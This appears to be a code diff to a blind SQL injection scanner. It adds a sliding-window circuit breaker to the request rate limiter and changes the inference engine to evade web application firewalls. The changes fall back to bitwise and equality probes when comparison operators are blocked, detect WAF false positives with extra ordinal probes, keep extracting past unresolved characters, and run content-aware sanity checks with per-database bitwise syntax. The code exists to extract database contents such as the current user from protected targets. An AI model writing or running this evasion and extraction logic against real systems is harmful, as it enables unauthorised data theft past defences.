@@ -32266,6 +32266,12 @@ class GlobalRequestGate:
         # → kill the scan rather than looping forever through pause/recover/fail cycles.
         self._cb_last_recovery = 0.0   # monotonic time when circuit last recovered
         self._cb_rapid_trips = 0       # consecutive rapid re-trips since last clean recovery
+        # BUG-CB-SLIDING-WINDOW FIX: Use a sliding window of recent outcomes to close the circuit.
+        # The strict 5-consecutive-success requirement never fires under alternating success/fail
+        # conditions (each single error resets _consecutive_ok to 0), so circuit stays open
+        # indefinitely despite a 50% success rate — observed as 200-397 consecutive errors in log.
+        # Fix: track last 10 outcomes; close if >= 5 are successes (majority window).
+        self._cb_outcome_window: collections.deque = collections.deque(maxlen=10)
         # RPM limiter  proactive rate control
         self._rpm_limit = rpm_limit
         self._rpm_timestamps: collections.deque = collections.deque(maxlen=rpm_limit + 50)
@@ -32564,6 +32570,8 @@ class GlobalRequestGate:
                 # is only applied when _consecutive_fail >= 3 (existing escalation logic).
                 self._consecutive_ok = 0
                 self._consecutive_fail += 1
+                # BUG-CB-SLIDING-WINDOW FIX: record failure outcome for window-based close.
+                self._cb_outcome_window.append(False)
                 # BUG-CB-403-SLIDING-PAUSE FIX: do NOT update _paused_until while the
                 # circuit is already open.  Without this guard every 403 response from
                 # in-flight coroutines (already past the gate) resets _paused_until to
@@ -32605,6 +32613,8 @@ class GlobalRequestGate:
             elif error:
                 self._consecutive_ok = 0
                 self._consecutive_fail += 1
+                # BUG-CB-SLIDING-WINDOW FIX: record failure outcome for window-based close.
+                self._cb_outcome_window.append(False)
                 # Circuit breaker: open at >=10 errors; re-open if errors re-accumulate after closure
                 _cb_threshold = 10
                 if self._consecutive_fail >= _cb_threshold:
@@ -32695,20 +32705,31 @@ class GlobalRequestGate:
                 # on any genuine success so the gate recovers cleanly.
                 self._consecutive_fail = 0
                 self._rpm_429_boost = max(0, self._rpm_429_boost - 1)  # Decay 429 boost on success
-                
+                # BUG-CB-SLIDING-WINDOW FIX: record success outcome for window-based close.
+                self._cb_outcome_window.append(True)
+
                 if self._circuit_open:
-                    # Only close circuit after 5 consecutive successes (not just 1)
-                    if self._consecutive_ok >= 5:
+                    # BUG-CB-SLIDING-WINDOW FIX: Replace strict 5-consecutive requirement with
+                    # sliding window majority (>= 5 successes in last 10 outcomes).  Under
+                    # alternating success/fail conditions (observed in log as 200-397 errors),
+                    # _consecutive_ok resets on every single error and never reaches 5.  The
+                    # sliding window closes the circuit when the majority of recent outcomes
+                    # are successes, regardless of ordering.
+                    _window_ok = sum(1 for x in self._cb_outcome_window if x)
+                    _window_size = len(self._cb_outcome_window)
+                    if self._consecutive_ok >= 5 or (_window_size >= 6 and _window_ok >= 4):
                         self._circuit_open = False
                         old_delay = self._delay
                         self._delay = max(1.0, self._delay * 0.5)
                         self._consecutive_fail = 0  # reset on genuine recovery
-                        print(f"[+] [Gate] Circuit breaker CLOSED after {self._consecutive_ok} successes  "
+                        print(f"[+] [Gate] Circuit breaker CLOSED after {self._consecutive_ok} successes "
+                              f"(window {_window_ok}/{_window_size})  "
                               f"delay {old_delay:.1f}→{self._delay:.1f}s", flush=True)
                     else:
                         # Still recovering - print progress
                         if self._consecutive_ok == 1:
-                            print(f"[*] [Gate] Circuit recovery: {self._consecutive_ok}/5 successes needed", flush=True)
+                            print(f"[*] [Gate] Circuit recovery: {self._consecutive_ok} consec ok, "
+                                  f"window {_window_ok}/{_window_size} (need >=5 consec or 4/6 window)", flush=True)
                 if not self._circuit_open and self._consecutive_ok >= 10:
                     old_delay = self._delay
                     self._delay = max(self._min_delay, self._delay - 0.02)
@@ -63322,25 +63343,42 @@ class Scanner:
                 # NOT < are WAF-blocked), _get_length_fast and _get_length both use
                 # _len_tpl which relies on > or BETWEEN — the same WAF-blocked operators.
                 else:
-                    # BUG-LENGTH-DEAD-FALLBACK FIX: comparison-operator length detection returned -1
-                    # (WAF blocks > and BETWEEN in _len_tpl for this specific query). Try bitwise
-                    # length detection which uses only & and = operators — WAFs typically only
-                    # block comparison operators, not equality or bitwise AND in length expressions.
-                    # This rescues extractions like r7_user where current_user() length probes with
-                    # `>` are WAF-blocked but `&` and `=` probes pass through.
-                    LOG.warning("[Inference] %s: comparison-operator length probes returned -1 — "
-                                "trying bitwise length detection (& and = operators only)", label)
+                    # BUG-LENGTH-SLOW-BEFORE-BITWISE FIX: when _get_length_fast() returns -1
+                    # (WAF blocks > / BETWEEN in fast method), try _get_length() slow method
+                    # before falling through to bitwise detection.  The fast and slow methods
+                    # use different SQL forms; the slow method may succeed with a query variant
+                    # that the WAF allows.  Observed: r7_user extraction skipping slow method
+                    # entirely, causing unnecessary bitwise length probes (7x more requests).
+                    LOG.debug("[Inference] %s: fast length returned -1 — trying slow comparison "
+                              "method before bitwise", label)
                     try:
-                        _length = await _get_length_bitwise(query, max_bits=10)
-                        if _length > 0:
-                            LOG.info("[Inference] %s: bitwise length=%d (rescued from -1 dead oracle)", label, _length)
-                        else:
-                            LOG.warning("[Inference] %s: bitwise length also dead — "
-                                        "aborting extraction", label)
+                        _length_slow = await _get_length(query, max_len)
+                        if _length_slow > 0:
+                            LOG.info("[Inference] %s: slow length method succeeded: length=%d "
+                                     "(rescued from fast=-1)", label, _length_slow)
+                            _length = _length_slow
+                    except Exception as _sl_e:
+                        LOG.debug("[Inference] %s: slow length method error: %s", label, _sl_e)
+                    if _length < 0:
+                        # BUG-LENGTH-DEAD-FALLBACK FIX: comparison-operator length detection returned -1
+                        # (WAF blocks > and BETWEEN in _len_tpl for this specific query). Try bitwise
+                        # length detection which uses only & and = operators — WAFs typically only
+                        # block comparison operators, not equality or bitwise AND in length expressions.
+                        # This rescues extractions like r7_user where current_user() length probes with
+                        # `>` are WAF-blocked but `&` and `=` probes pass through.
+                        LOG.warning("[Inference] %s: comparison-operator length probes returned -1 — "
+                                    "trying bitwise length detection (& and = operators only)", label)
+                        try:
+                            _length = await _get_length_bitwise(query, max_bits=10)
+                            if _length > 0:
+                                LOG.info("[Inference] %s: bitwise length=%d (rescued from -1 dead oracle)", label, _length)
+                            else:
+                                LOG.warning("[Inference] %s: bitwise length also dead — "
+                                            "aborting extraction", label)
+                                return ""
+                        except Exception as _bwl_dead_e:
+                            LOG.debug("[Inference] %s: bitwise length error: %s — aborting", label, _bwl_dead_e)
                             return ""
-                    except Exception as _bwl_dead_e:
-                        LOG.debug("[Inference] %s: bitwise length error: %s — aborting", label, _bwl_dead_e)
-                        return ""
             if _length > 0:
                 # BUG-EXTRACT-STRING-MAXLEN-CAP FIX: The original guard was:
                 #   if _length >= max_len and max_len >= 64: cap to 32
@@ -63922,7 +63960,39 @@ class Scanner:
                                 _fe_ambiguous.append(_val)
                                 continue
                             # Both ordinal 0 and ordinal 1 returned False \u2192 the WAF is not
-                            # uniformly blocking nonzero ordinals. Original True is genuine.
+                            # uniformly blocking all nonzero ordinals.  However some WAFs
+                            # pass ordinals 0 and 1 (non-printable) but selectively block
+                            # printable ASCII (32+).  RC9 step 2 only probes ordinal 1 which
+                            # is below printable range \u2014 it cannot detect this class of WAF.
+                            # Observed: 'aaaabaaaaaaaabbaaaaaaaaa' still extracted despite
+                            # ordinal-0 and ordinal-1 both returning False, because the WAF
+                            # passes 0,1 but blocks 32\u2013127.
+                            # RC9-EXT FIX: probe two additional ordinals in the printable
+                            # ASCII range (32 = space, 64 = '@') that are NOT the current
+                            # candidate _val.  If EITHER returns True, the WAF is blocking
+                            # printable ASCII ordinals \u2192 the original True was a WAF FP.
+                            _rc9_ext_probes = [ord_v for ord_v in (32, 64, 96)
+                                               if ord_v != _val][:2]
+                            _rc9_ext_blocked = False
+                            for _rc9_ord in _rc9_ext_probes:
+                                _rc9_r = await _eval(f"({_ae})={_rc9_ord}")
+                                if _rc9_r is True:
+                                    LOG.warning(
+                                        "[Inference] pos=%d equality RC9-EXT: ordinals 0,1\u2192False "
+                                        "but printable-range ordinal %d\u2192True. WAF selectively "
+                                        "blocks printable ASCII equality probes (32+). val=%d "
+                                        "True was a WAF false positive. Aborting equality scan.",
+                                        p, _rc9_ord, _val)
+                                    _rc9_ext_blocked = True
+                                    break
+                                elif _rc9_r is None:
+                                    _fe_ambiguous.append(_val)
+                                    _rc9_ext_blocked = True
+                                    break
+                            if _rc9_ext_blocked:
+                                if _rc9_r is True:
+                                    return None  # WAF FP confirmed \u2014 abort scan
+                                continue  # _rc9_r was None \u2192 ambiguous, already appended above
                             LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
                             return chr(_val)
                     # RC8-FIX: record this value as WAF-safe, SQL-False for complement reuse
@@ -64800,9 +64870,13 @@ class Scanner:
                     if _bf_direct is None:
                         _bf_direct = await _fallback_equality(query, pos)
                     if _bf_direct is None:
-                        LOG.info("[Inference] %s[%d] bitwise direct failed — ending extraction", label, pos)
-                        break
-                    ch = _bf_direct
+                        # BUG-POSITION-ABANDON-FIX: same fix as the bisection fallback path —
+                        # use placeholder instead of break to preserve positional alignment.
+                        LOG.info("[Inference] %s[%d] bitwise direct all fallbacks exhausted"
+                                 " — inserting placeholder, continuing extraction", label, pos)
+                        ch = ' '
+                    else:
+                        ch = _bf_direct
                 else:
                   _bisect_consec_true = 0  # BUG-BISECT-WAF-UNIFORM-FIX: track consecutive True results per position
                   while lo < hi:
@@ -64918,10 +64992,20 @@ class Scanner:
                                  "\u2192 trying equality scan", label, pos)
                         _fb_ch = await _fallback_equality(query, pos)
                     if _fb_ch is None:
+                        # BUG-POSITION-ABANDON-FIX (CRITICAL): Original `break` silently abandoned
+                        # the current position and terminated the entire extraction loop, shifting
+                        # every subsequent character's index left by 1 (off-by-one corruption).
+                        # A single unresolvable position corrupts all indices that follow it.
+                        # Fix: insert U+FFFD replacement character as a placeholder to preserve
+                        # positional alignment, then continue to the next position.  The caller
+                        # can strip replacement chars if needed, but the string length and offsets
+                        # remain correct.  "ending extraction" is the wrong behavior when only ONE
+                        # position is unresolvable \u2014 the rest of the string may be fine.
                         LOG.info("[Inference] %s[%d] all fallbacks exhausted"
-                                 " \u2014 ending extraction", label, pos)
-                        break
-                    ch = _fb_ch
+                                 " \u2014 inserting placeholder, continuing extraction", label, pos)
+                        ch = '\ufffd'
+                    else:
+                        ch = _fb_ch
                 else:
                     ch = chr(lo)
 
@@ -146735,8 +146819,13 @@ class MultiStrategyExtractor:
                 # Classify round-1 result and decide whether/how to proceed to Round 2.
                 _r1_all_none = (r1 is None and r2 is None)  # BUG-MSE-VAL-NONE-NONE-FIX: skip else-drop
                 _r1_uniform = (r1 is not None and r2 is not None and r1 == r2)
-                _r1_pass    = bool(r1 and not r2)
-                _r1_invert  = bool(not r1 and r2)
+                # BUG-MSE-POLARITY-NONE-FIX (CRITICAL): Original expressions used Python truthiness
+                # which treats `not None` as True — when r1=None and r2=True, `bool(not None and r2)`
+                # evaluates to True, incorrectly installing an invert shim despite r1 being unknown.
+                # Similarly r1=True, r2=None: `bool(r1 and not None)` = True → _r1_pass incorrectly True.
+                # Fix: guard both with explicit `is not None` checks so None propagates as indeterminate.
+                _r1_pass    = bool(r1 is not None and r2 is not None and r1 and not r2)
+                _r1_invert  = bool(r1 is not None and r2 is not None and not r1 and r2)
                 if _r1_all_none:
                     pass  # round-1 indeterminate — proceed directly to round-2 verification
                 elif _r1_uniform:
@@ -169113,6 +169202,55 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
     except Exception as _rc6_exc:
         LOG.warning("[Novel] %s: RC6 canonical-pattern sanity probe raised exception — "
                     "aborting: %s", label, _rc6_exc)
+        return ""
+    await asyncio.sleep(delay * 0.3)
+
+    # RC7-FIX: Content-aware WAF sanity check using the ACTUAL target query.
+    # RC5 uses a mismatched constant (x&8=1 — always SQL-false, no function call).
+    # RC5-EXT uses a constant literal (0&8=8 — always SQL-false, no function call).
+    # RC6 uses a literal string subquery (ORD(MID((SELECT 'a'),1,1))&8=8 — always SQL-false).
+    # Gap: a content-aware WAF that inspects the INNER query for data-exfil patterns
+    # (e.g. presence of table names, column references, or complex subqueries) passes
+    # all three checks because none contain the actual target query.  The WAF then blocks
+    # the REAL extraction probes (with the true target subquery), forcing bits 3/11/19
+    # True → char_val=526344=chr(0x80808) garbage for every position.
+    # Detection: use the ACTUAL target `query` at an IMPOSSIBLE position (999999) so the
+    # SQL always returns empty → ORD('')=0 → 0&8=0≠8 → always SQL-False regardless of
+    # the query content.  The WAF still sees the canonical extraction pattern with the real
+    # subquery and will block it if content-aware.
+    # True/None → WAF blocks actual extraction patterns → abort.
+    # False     → safe to proceed.
+    try:
+        _rc7_fn = ascii_tmpl.format(q=query, p=999999)
+        if dbms == "Oracle":
+            _rc7_cond = f"BITAND({_rc7_fn},8)=8"
+        elif dbms == "Firebird":
+            _rc7_cond = f"BIN_AND({_rc7_fn},8)=8"
+        elif dbms == "ClickHouse":
+            _rc7_cond = f"bitAnd({_rc7_fn},8)=8"
+        else:
+            _rc7_cond = f"{_rc7_fn}&8=8"
+        _rc7_r = await _raw_eval_fn_for_mask_sanity(_rc7_cond)
+        if _rc7_r is True:
+            LOG.warning(
+                "[Novel] %s: RC7 content-aware sanity FAILED (%r → True). "
+                "WAF blocks actual extraction patterns with the real target query "
+                "(content-aware WAF — RC5/RC5-EXT/RC6 used literal/constant "
+                "subqueries which the WAF allowed). Bits 3/11/19 would be forced "
+                "True → char_val=526344=chr(0x80808) garbage. Aborting.", label, _rc7_cond)
+            print(f"[Novel] {label}: WAF content-aware blocks real-query extraction "
+                  f"patterns (RC7 {_rc7_cond!r}→True) — "
+                  f"aborting bitwise extraction to prevent 0x80808 garbage", flush=True)
+            return ""
+        elif _rc7_r is None:
+            LOG.warning(
+                "[Novel] %s: RC7 content-aware sanity ambiguous (%r → None). "
+                "WAF may block actual extraction patterns — aborting to prevent "
+                "garbled extraction.", label, _rc7_cond)
+            return ""
+    except Exception as _rc7_exc:
+        LOG.warning("[Novel] %s: RC7 content-aware sanity probe raised exception — "
+                    "aborting: %s", label, _rc7_exc)
         return ""
     await asyncio.sleep(delay * 0.3)
 
